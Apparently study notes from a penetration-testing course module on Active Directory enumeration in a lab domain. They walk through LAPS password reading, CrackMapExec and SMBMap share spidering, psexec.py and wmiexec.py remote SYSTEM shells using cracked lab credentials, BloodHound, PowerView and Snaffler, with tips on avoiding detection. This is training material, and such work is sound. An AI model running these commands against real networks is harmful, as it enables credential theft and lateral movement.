The Microsoft Local Administrator Password Solution (LAPS) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed. The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) greatly facilitates this with several functions. One is parsing ExtendedRights for all computers with LAPS enabled. This will show groups specifically delegated to read LAPS passwords, which are often users in protected groups. An account that has joined a computer to a domain receives All Extended Rights over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.
```powershell
PS C:\htb> Find-LAPSDelegatedGroups
```
The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.
```powershell
PS C:\htb> Find-AdmPwdExtendedRights
```
We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.
```powershell
PS C:\htb> Get-LAPSComputers
```
# Credentialed Enumeration - from Linux
Now that we have acquired a foothold in the domain, it is time to dig deeper using our low privilege domain user credentials. Since we have a general idea about the domain's userbase and machines, it's time to enumerate the domain in depth. We are interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more. We have various options available, but the most important thing to remember is that _most of these tools will not work without valid domain user credentials at any permission level. So at a minimum, we will have to have acquired a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host_.
## Using CrackMapExec
CrackMapExec (CME) is a powerful toolset to help with assessing AD environments. It utilizes packages from the Impacket and PowerSploit toolkits to perform its functions. For detailed explanations on using the tool and accompanying modules, see the wiki. We can see that we can use the tool with MSSQL, SMB, SSH, and WinRM credentials. Let's look at our options for CME with the SMB protocol:
CME offers a help menu for each protocol (i.e., crackmapexec winrm -h, etc.). Be sure to review the entire help menu and all possible options. For now, the flags we are interested in are:
Option | Description
-- | --
`-u`| Username The user whose credentials we will use to authenticate
`-p`| Password User's password
`Target (`|IP or FQDN) Target host to enumerate (in our case, the Domain Controller)
`--users`| Specifies to enumerate Domain Users
`--groups`| Specifies to enumerate domain groups
`--loggedon`|-users Attempts to enumerate what users are logged on to a target, if any
We'll start by using the SMB protocol to enumerate users and groups. _We will target the Domain Controller (whose address we uncovered earlier) because it holds all data in the domain database that we are interested in_. Make sure you preface all commands with sudo.
### CME - Domain User Enumeration
We start by pointing CME at the Domain Controller and using the credentials for the forend user to retrieve a list of all domain users. Notice when it provides us the user information, it includes data points such as the badPwdCount attribute. This is helpful when performing actions like targeted password spraying. We could build a target user list filtering out any users with their badPwdCount attribute above 0 to be extra careful not to lock any accounts out.
```bash
m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
### CME - Domain Group Enumeration
```bash
m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
! The above snippet lists the groups within the domain and the number of users in each. The output also shows the built-in groups on the Domain Controller, such as Backup Operators. We can begin to note down groups of interest. Take note of key groups like Administrators, Domain Admins, Executives, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting during our assessment.
### CME - Logged On Users
We can also use CME to target other hosts. Let's check out what appears to be a file server to see what users are logged in currently.
```bash
m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
We see that many users are logged into this server which is very interesting. We can also see that our user forend is a local admin because (Pwn3d!) appears after the tool successfully authenticates to the target host. A host like this may be used as a jump host or similar by administrative users. We can see that the user wley is logged in, who we earlier identified as a domain admin. It could be an easy win if we can steal this user's credentials from memory or impersonate them.
As we will see later, BloodHound (and other tools such as PowerView) can be used to hunt for user sessions. BloodHound is particularly powerful as we can use it to view Domain User sessions graphically and quickly in many ways. Regardless, tools such as CME are great for more targeted enumeration and user hunting.
### CME Share Searching
We can use the `--shares` flag to enumerate available shares on the remote host and the level of access our user account has to each share (READ or WRITE access). Let's run this against the INLANEFREIGHT.LOCAL Domain Controller.
```bash
m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
We see several shares available to us with READ access. The Department Shares, User Shares, and ZZZ_archive shares would be worth digging into further as they may contain sensitive data such as passwords or PII. Next, we can dig into the shares and spider each directory looking for files. The module `spider_plus` will dig through each readable share on the host and list all readable files. Let's give it a try.
```bash
m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
In the above command, we ran the spider against the Department Shares. When completed, CME writes the results to a JSON file located at `/tmp/cme_spider_plus/<ip of host>`. We could dig around for interesting files such as web.config files or scripts that may contain passwords. If we wanted to dig further, we could pull those files to see what all resides within, perhaps finding some hardcoded credentials or other sensitive information.
## Using SMBMap
SMBMap is great for enumerating SMB shares from a Linux attack host. It can be used to gather a listing of shares, permissions, and share contents if accessible. Once access is obtained, it can be used to download and upload files and execute remote commands.
Like CME, we can use SMBMap and a set of domain user credentials to check for accessible shares on remote systems. As with other tools, we can type the command smbmap -h to view the tool usage menu. _Aside from listing shares, we can use SMBMap to recursively list directories, list the contents of a directory, search file contents, and more_. This can be especially useful when pillaging shares for useful information.
#### SMBMap To Check Access
```bash
m1l0js@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
The above will tell us what our user can access and their permission levels. Like our results from CME, we see that the user forend has no access to the DC via the ADMIN$ or C$ shares (this is expected for a standard user account), but does have _read access over IPC$, NETLOGON, and SYSVOL which is the default in any domain_. The other non-standard shares, such as Department Shares and the user and archive shares, are most interesting. Let's do a recursive listing of the directories in the Department Shares share. We can see, as expected, subdirectories for each department in the company.
#### Recursive List Of All Directories
```bash
m1l0js@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
As the recursive listing dives deeper, it will show you the output of all subdirectories within the higher-level directories. The use of `--dir-only` provided only the output of all directories and did not list all files. Try this against other shares on the Domain Controller and see what you can find.
## Using rpcclient
rpcclient is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD. It is highly versatile; we just have to find the correct command to issue for what we want to accomplish. The man page for rpcclient is very helpful for this; just type `man rpcclient` into your attack host's shell and review the options available. Let's cover a few rpcclient functions that can be helpful during a penetration test.
Due to SMB NULL sessions (covered in-depth in the password spraying sections) on some of our hosts, we can perform authenticated or unauthenticated enumeration using rpcclient in the INLANEFREIGHT.LOCAL domain. An example of using rpcclient from an unauthenticated standpoint (if this configuration exists in our target domain) would be:
```bash
rpcclient -U "" -N 172.16.5.5
```
The above will provide us with a bound connection, and we should be greeted with a new prompt to start unleashing the power of rpcclient. From here, we can begin to enumerate any number of different things. 
### Enumerating domain users by RID
Let's start with domain users. While looking at users in rpcclient, you may notice a field called rid: beside each user. _A Relative Identifier (RID) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects_. To explain how this fits in, let's look at the examples below:
+ The SID for the INLANEFREIGHT.LOCAL domain is: S-1-5-21-3842939050-3880317879-2865463114.
+ When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
+ So the domain user htb-student with a RID:[0x457] Hex 0x457 would = decimal 1111, will have a full user SID of: S-1-5-21-3842939050-3880317879-2865463114-1111.
+ This is unique to the htb-student object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.
However, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID [administrator] rid:[0x1f4], which, when converted to a decimal value, equals 500. _The built-in Administrator account will always have the RID value Hex 0x1f4, or 500. This will always be the case_. Since this value is unique to an object, we can use it to enumerate further information about it from the domain. Let's give it a try again with rpcclient. We will dig a bit targeting the htb-student user.
```bash
rpcclient $> queryuser 0x457
```
When we searched for information using the queryuser command against the RID 0x457, RPC returned the user information for htb-student as expected. This wasn't hard since we already knew the RID for htb-student. 
### Enumerating domain users with enumdomusers
If we wished to enumerate all users to gather the RIDs for more than just one, we would use the enumdomusers command.
```bash
rpcclient $> enumdomusers
```
## Using Impacket Toolkit
Impacket is a versatile toolkit that provides us with many different ways to enumerate, interact, and exploit Windows protocols and find the information we need using Python. The tool is actively maintained and has many contributors, especially when new attack techniques arise. We could perform many other actions with Impacket, but _we will only highlight a few in this section; wmiexec.py and psexec.py_. Earlier in the poisoning section, we grabbed a hash for the user wley with Responder and cracked it to obtain the password transporter@4. We will see in the next section that this user is a local admin on the ACADEMY-EA-FILE host. We will utilize the credentials for the next few actions.
### Psexec.py
One of the most useful tools in the Impacket suite is psexec.py. `Psexec.py is a clone of the Sysinternals psexec executable`, but works slightly differently from the original. _The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host_. To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.
```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```
Once we execute the psexec module, it drops us into the system32 directory on the target host. We ran the whoami command to verify, and it confirmed that we landed on the host as SYSTEM. From here, we can perform most any task on this host; anything from further enumeration to persistence and lateral movement. 
### Wmiexec.py
Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. _It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands)_. This is a more stealthy approach to execution on hosts than other tools, but _would still likely be caught by most modern anti-virus and EDR systems_. We will use the same account as with psexec.py to access the host.
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```
Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. _The downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command_. This isn't always malicious activity since many organizations utilize WMI to administer computers, but it can be a tip-off in an investigation. 
## Using Windapsearch
Windapsearch is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries. It is present in our attack host's /opt/windapsearch/ directory. We have several options with Windapsearch to perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The `--da` (enumerate domain admins group members ) option and the `-PU` ( find privileged users) options. The `-PU` option is interesting because it will perform a recursive search for users with nested group membership.
### Windapsearch - Domain Admins
```bash
m1l0js@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
To identify more potential users, we can run the tool with the -PU flag and check for users with elevated privileges that may have gone unnoticed. This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.
### Windapsearch - Privileged Users
```bash
m1l0js@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```
You'll notice that it performed mutations against common elevated group names in different languages. This output gives an example of the dangers of nested group membership, and this will become more evident when we work with BloodHound graphics to visualize this.
## Using Bloodhound.py
Once we have domain credentials, we can run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) BloodHound ingestor _from our Linux attack host_. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or "attack paths" of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses graph theory to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. _The tool consists of two parts: the SharpHound collector written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files_. Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://blog.cptjesus.com/posts/introtocypher). The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.

It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, ldap3, and dnspython) was released by a community member. This helped immensely during penetration tests when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from. This also helps us not have to run the collector from a domain host, which could potentially be blocked or set off alerts (though even running it from our attack host will most likely set off alarms in well-protected environments).
As we can see the tool accepts various collection methods with the `-c` or `--collectionmethod` flag. We can retrieve specific data such as user sessions, users and groups, object properties, ACLS, or select all to gather as much data as possible. Let's run it this way.
```bash
m1l0js@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```
The command above executed Bloodhound.py with the user forend. We specified our nameserver as the Domain Controller with the `-ns` flag and the domain, INLANEFREIGHt.LOCAL with the `-d` flag. The `-c` all flag told the tool to run all checks. Once the script finishes, we will see the output files in the current working directory in the format of <date_object.json>.
### Upload the Zip File into the BloodHound GUI
* We could then type `sudo neo4j start` to start the neo4j service, firing up the database we'll load the data into and also run Cypher queries against.
* Next, we can type bloodhound from our Linux attack host when logged in using freerdp to start the BloodHound GUI application and upload the data. The credentials are pre-populated on the Linux attack host, but if for some reason a credential prompt is shown, use:
```txt
user == neo4j / pass == HTB_@cademy_stdnt!.
```
Once all of the above is done, we should have the BloodHound GUI tool loaded with a blank slate. Now we need to upload the data. We can either upload each JSON file one by one or zip them first with a command such as `zip -r ilfreight_bh.zip *.json` and upload the Zip file. We do this by clicking the Upload Data button on the right side of the window (green arrow). When the file browser window pops up to select a file, choose the zip file (or each JSON file) (red arrow) and hit Open.
Now that the data is loaded, we can use the Analysis tab to run queries against the database. These queries can be custom and specific to what you decide using custom Cypher queries. There are many great cheat sheets to help us here. We will discuss [custom Cypher queries](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/) more in a later section. As seen below, we can use the built-in Path Finding queries on the Analysis tab on the Left side of the window.

In the next section, we will cover running the SharpHound collector from a domain-joined Windows host and work through some examples of working with the data in the BloodHound GUI.
## WADComs
We experimented with several new tools for domain enumeration from a Linux host. The following section will cover several more tools we can use from a domain-joined Windows host. As a quick note, if you haven't checked out the [WADComs](https://wadcoms.github.io/) project yet, you definitely should. It is an interactive cheat sheet for many of the tools we will cover (and more) in this module. It's hugely helpful when you can't remember exact command syntax or are trying out a tool for the first time. Worth bookmarking and even contributing to!

# Credentialed Enumeration - from Windows
In the previous section, we explored some tools we can use from our Linux attack host for enumeration with valid domain credentials. In this section, we will experiment with a few tools for enumerating from a Windows attack host, such as SharpHound/BloodHound, PowerView/SharpView, Grouper2, Snaffler, and some built-in tools useful for AD enumeration. Some of the data we gather in this phase may provide more information for reporting, not just directly lead to attack paths. _Depending on the assessment type, our client may be interested in all possible findings, so even issues like the ability to run BloodHound freely or certain user account attributes may be worth including in our report as either medium-risk findings or a separate appendix section_. Not every issue we uncover has to be geared towards forwarding our attacks. Some of the results may be informational in nature but useful to the customer to help improve their security posture.
At this point, we are interested in other misconfigurations and permission issues that could lead to lateral and vertical movement. We are also interested in getting a bigger picture of how the domain is set up, i.e., do any trusts exist with other domains both inside and outside the current forest? We're also interested in pillaging file shares that our user has access to, as these often contain sensitive data such as credentials that can be used to further our access.
## Using ActiveDirectory Powershell module
The first tool we will explore is the [ActiveDirectory PowerShell module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps). When landing on a Windows host in the domain, especially one an admin uses, there is a chance you will find valuable tools and scripts on the host.
The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line. It consists of 147 different cmdlets at the time of writing. We can't cover them all here, but we will look at a few that are particularly useful for enumerating AD environments. Feel free to explore other cmdlets included in the module in the lab built for this section, and see what interesting combinations and output you can create.
Before we can utilize the module, we have to make sure it is imported first. _The Get-Module cmdlet, which is part of the Microsoft.PowerShell.Core module, will list all available modules, their version, and potential commands for use_. This is a great way to see if anything like Git or custom administrator scripts are installed. If the module is not loaded, run Import-Module ActiveDirectory to load it for use.
### Discover Modules
```powershell
PS C:\htb> Get-Module
ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
```
We'll see that the ActiveDirectory module is not yet imported. Let's go ahead and import it.
### Load ActiveDirectory Module
```powershell
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...  
```
Now that our modules are loaded, let's begin. 
### Get Domain Info
First up, we'll enumerate some basic information about the domain with the Get-ADDomain cmdlet.
```powershell
PS C:\htb> Get-ADDomain
```
This will print out helpful information like the domain SID, domain functional level, any child domains, and more. 
### Get-ADUser
Next, we'll use the Get-ADUser cmdlet. We will be filtering for accounts with the ServicePrincipalName property populated. _This will get us a listing of accounts that may be susceptible to a Kerberoasting attack_, which we will cover in-depth after the next section.
```powershell
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
### Checking For Trust Relationships
Another interesting check we can run utilizing the ActiveDirectory module, would be to verify domain trust relationships using the Get-ADTrust cmdlet
```powershell
PS C:\htb> Get-ADTrust -Filter *
```
This cmdlet will print out any trust relationships the domain has. We can determine if they are trusts within our forest or with domains in other forests, the type of trust, the direction of the trust, and the name of the domain the relationship is with. This will be useful later on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts. 
### Group Enumeration
Next, we can gather AD group information using the Get-ADGroup cmdlet.
```powershell
PS C:\htb> Get-ADGroup -Filter * | select name
```
#### Detailed Group Info
We can take the results and feed interesting names back into the cmdlet to _get more detailed information about a particular group like so_:
```powershell
PS C:\htb> Get-ADGroup -Identity "Backup Operators"
```
#### Group Membership
Now that we know more about the group, let's get a member listing using the Get-ADGroupMember cmdlet.
```powershell
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
```
We can see that one account, backupagent, belongs to this group. It is worth noting this down because if we can take over this service account through some attack, we could use its membership in the Backup Operators group to take over the domain. We can perform this process for the other groups to fully understand the domain membership setup. Try repeating the process with a few different groups. You will see that this process can be tedious, and we will be left with an enormous amount of data to sift through. We must know how to do this with built-in tools such as the ActiveDirectory PowerShell module, but we will see later in this section just how much tools like BloodHound can speed up this process and make our results far more accurate and organized.
_Utilizing the ActiveDirectory module on a host can be a stealthier way of performing actions than dropping a tool onto a host or loading it into memory and attempting to use it_. This way, our actions could potentially blend in more. Next, we will walk through the PowerView tool, which has many features to simplify enumeration and dig deeper into the domain.
## Using PowerView
[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us gain situational awareness within an AD environment. Much like BloodHound, it provides a way to identify where users are logged in on a network, enumerate domain information such as users, computers, groups, ACLS, trusts, hunt for file shares and passwords, perform Kerberoasting, and more. It is a highly versatile tool that can provide us with great insight into the security posture of our client's domain. _It requires more manual work to determine misconfigurations and relationships within the domain than BloodHound but, when used right, can help us to identify subtle misconfigurations_.
Let's examine some of PowerView's capabilities and see what data it returns. The table below describes some of the most useful functions PowerView offers.
Command |  			Description
-- | -- 
Export-PowerViewCSV |  		Append results to a CSV file
ConvertTo-SID |  			Convert a User or group name to its SID value
Get-DomainSPNTicket |  		Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
Domain/LDAP Functions |  : 	
Get-Domain |  			Will return the AD object for the current (or specified) domain
Get-DomainController |  		Return a list of the Domain Controllers for the specified domain
Get-DomainUser |  			Will return all users or specific user objects in AD
Get-DomainComputer |  		Will return all computers or specific computer objects in AD
Get-DomainGroup |  		Will return all groups or specific group objects in AD
Get-DomainOU |  			Search for all or specific OU objects in AD
Find-InterestingDomainAcl |  	Finds object ACLs in the domain with modification rights set to non-built in objects
Get-DomainGroupMember |  		Will return the members of a specific domain group
Get-DomainFileServer |  		Returns a list of servers likely functioning as file servers
Get-DomainDFSShare |  		Returns a list of all distributed file systems for the current (or specified) domain
GPO Functions |  	:
Get-DomainGPO |  			Will return all GPOs or specific GPO objects in AD
Get-DomainPolicy |  		Returns the default domain policy or the domain controller policy for the current domain
Computer Enumeration Functions | : 	
Get-NetLocalGroup |  		Enumerates local groups on the local or a remote machine
Get-NetLocalGroupMember |  	Enumerates members of a specific local group
Get-NetShare |  			Returns open shares on the local (or a remote) machine
Get-NetSession |  			Will return session information for the local (or a remote) machine
Test-AdminAccess |  		Tests if the current user has administrative access to the local (or a remote) machine
Threaded 'Meta' -Functions | :
Find-DomainUserLocation |  	Finds machines where specific users are logged in
Find-DomainShare |  		Finds reachable shares on domain machines
Find-InterestingDomainShareFile |  	Searches for files matching specific criteria on readable shares in the domain
Find-LocalAdminAccess |  		Find machines on the local domain where the current user has local administrator access
Domain Trust Functions | : 	
Get-DomainTrust |  		Returns domain trusts for the current domain or a specified domain
Get-ForestTrust |  		Returns all forest trusts for the current forest or a specified forest
Get-DomainForeignUser |  		Enumerates users who are in groups outside of the user's domain
Get-DomainForeignGroupMember |  	Enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainTrustMapping |  		Will enumerate all trusts for the current domain and any others seen.
This table is not all-encompassing for what PowerView offers, but it includes many of the functions we will use repeatedly. Below we will experiment with a few of them.
### Domain User Information
First up is the Get-DomainUser function. This will provide us with information on all users or specific users we specify. Below we will use it to grab information about a specific user, mmorgan.
```powershell
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```
We saw some basic user information with PowerView. 
### Recursive Group Membership
Now let's enumerate some domain group information. We can use the Get-DomainGroupMember function to retrieve group-specific information. Adding the -Recurse switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups. For example, the output below shows that the Secadmins group is part of the Domain Admins group through nested group membership. In this case, we will be able to view all of the members of that group who inherit Domain Admin rights via their group membership.
```powershell
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
Above we performed a recursive look at the Domain Admins group to list its members. Now we know who to target for potential elevation of privileges. 
### Trust Enumeration
Like with the AD PowerShell module, we can also enumerate domain trust mappings.
```powershell
PS C:\htb> Get-DomainTrustMapping
```
### Testing for Local Admin Access
We can use the Test-AdminAccess function to test for local admin access on either the current machine or a remote one.
```powershell
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01

ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True 
```
Above, we determined that the user we are currently using is an administrator on the host ACADEMY-EA-MS01. We can perform the same function for each host to see where we have administrative access. We will see later how well BloodHound performs this type of check. 
### Finding Users With SPN Set
Now we can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.
```powershell
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
PowerView is part of the now deprecated PowerSploit offensive PowerShell toolkit. The tool has been receiving updates by BC-Security as part of their [Empire 4 framework](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1). Empire 4 is BC-Security's fork of the original Empire project and is actively maintained as of April 2022. We show examples throughout this module using the development version of PowerView because it is an excellent tool for recon in an Active Directory environment, and is still extremely powerful and helpful in modern AD networks even though the original version is not maintained. The BC-SECURITY version of PowerView has some new functions such as [Get-NetGmsa](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), used to hunt for Group Managed Service Accounts, which is out of scope for this module. It is worth playing around with both versions to see the subtle differences between the old and currently maintained versions.
## SharpView
Another tool worth experimenting with is SharpView, a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView. We can type a method name with -Help to get an argument list.
### Finding Users With SPN Set
```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Help

Get_DomainUser -Identity <String[]> -DistinguishedName <String[]> -SamAccountName <String[]> -Name <String[]> -MemberDistinguishedName <String[]> -MemberName <String[]> -SPN <Boolean> -AdminCount <Boolean> -AllowDelegation <Boolean> -DisallowDelegation <Boolean> -TrustedToAuth <Boolean> -PreauthNotRequired <Boolean> -KerberosPreauthNotRequired <Boolean> -NoPreauth <Boolean> -Domain <String> -LDAPFilter <String> -Filter <String> -Properties <String[]> -SearchBase <String> -ADSPath <String> -Server <String> -DomainController <String> -SearchScope <SearchScope> -ResultPageSize <Int32> -ServerTimeLimit <Nullable`1> -SecurityMasks <Nullable`1> -Tombstone <Boolean> -FindOne <Boolean> -ReturnOne <Boolean> -Credential <NetworkCredential> -Raw <Boolean> -UACFilter <UACEnum> 
```
Here we can use SharpView to enumerate information about a specific user, such as the user forend, which we control.
```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
```
Experiment with SharpView on the MS01 host and recreate as many PowerView examples as possible. Though evasion is not in scope for this module, _SharpView can be useful when a client has hardened against PowerShell usage or we need to avoid using PowerShell_.
## Shares
Shares allow users on a domain to quickly access information relevant to their daily roles and share content with their organization. When set up correctly, domain shares will require a user to be domain joined and required to authenticate when accessing the system. Permissions will also be in place to ensure users can only access and see what is necessary for their daily role. Overly permissive shares can potentially cause accidental disclosure of sensitive information, especially those containing medical, legal, personnel, HR, data, etc. In an attack, gaining control over a standard domain user who can access shares such as the IT/infrastructure shares could lead to the disclosure of sensitive data such as configuration files or authentication files like SSH keys or passwords stored insecurely. We want to identify any issues like these to ensure the customer is not exposing any data to users who do not need to access it for their daily jobs and that they are meeting any legal/regulatory requirements they are subject to (HIPAA, PCI, etc.). We can use PowerView to hunt for shares and then help us dig through them or use various manual commands to hunt for common strings such as files with pass in the name. This can be a tedious process, and we may miss things, especially in large environments. Now, let's take some time to explore the tool Snaffler and see how it can aid us in identifying these issues more accurately and efficiently.
### Snaffler
[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context. To execute Snaffler, we can use the command below:
```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
The `-s` tells it to print results to the console for us, the `-d` specifies the domain to search within, and the `-o` tells Snaffler to write results to a logfile. The `-v` option is the verbosity level. Typically data is best as it only displays results to the screen, so it's easier to begin looking through the tool runs. Snaffler can produce a considerable amount of data, so we should typically output to file and let it run and then come back to it later. It can also be helpful to provide Snaffler raw output to clients as supplemental data during a penetration test as it can help them zero in on high-value shares that should be locked down first.
```powershell
PS C:\htb> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
```
We may find passwords, SSH keys, configuration files, or other data that can be used to further our access. Snaffler color codes the output for us and provides us with a rundown of the file types found in the shares. Now that we have a wealth of data about the INLANEFREIGHT.LOCAL domain (and hopefully clear notes and log file output!), we need a way to correlate it and visualize it. Let's dive deeper into BloodHound and see how powerful this tool can be during any AD-focused security assessment.
## BloodHound
As discussed in the previous section, Bloodhound is an exceptional open-source tool that can identify attack paths within an AD environment by analyzing the relationships between objects. Both penetration testers and blue teamers can benefit from learning to use BloodHound to visualize relationships in the domain. When used correctly and coupled with custom Cipher queries, BloodHound may find high-impact, but difficult to discover, flaws that have been present in the domain for years.

First, we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host. There are many ways to achieve this covered in the File Transfer module. For our purposes, we will work with SharpHound.exe already on the attack host, but it's worth experimenting with transferring the tool to the attack host from Pwnbox or our own VM using methods such as a Python HTTP server, smbserver.py from Impacket, etc. We'll start by running the SharpHound.exe collector from the MS01 attack host.
```bash
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
```
Next, we can exfiltrate the dataset to our own VM or ingest it into the BloodHound GUI tool on MS01. We can do this on MS01 by typing bloodhound into a CMD or PowerShell console. The credentials should be saved, but enter neo4j: HTB_@cademy_stdnt! if a prompt appears. Next, click on the Upload Data button on the right-hand side, select the newly generated zip file, and click Open. An Upload Progress window will pop up. Once all .json files show 100% complete, click the X at the top of that window.
We can start by typing domain: in the search bar on the top left and choosing INLANEFREIGHT.LOCAL from the results. Take a moment to browse the node info tab. As we can see, this would be a rather large company with over 550 hosts to target and trusts with two other domains.
Now, let's check out a few pre-built queries in the Analysis tab. The query _Find Computers with Unsupported Operating Systems is great for finding outdated and unsupported operating systems running legacy software_. These systems are relatively common to find within enterprise networks (especially older environments), as they often run some product that cannot be updated or replaced as of yet. Keeping these hosts around may save money, but they also can add unnecessary vulnerabilities to the network. Older hosts may be susceptible to older remote code execution vulnerabilities like MS08-067. If we come across these older hosts during an assessment, we should be careful before attacking them (or even check with our client) as they may be fragile and running a critical application or service. We can advise our client to segment these hosts off from the rest of the network as much as possible if they cannot remove them yet, but should also recommend that they start putting together a plan to decommission and replace them.
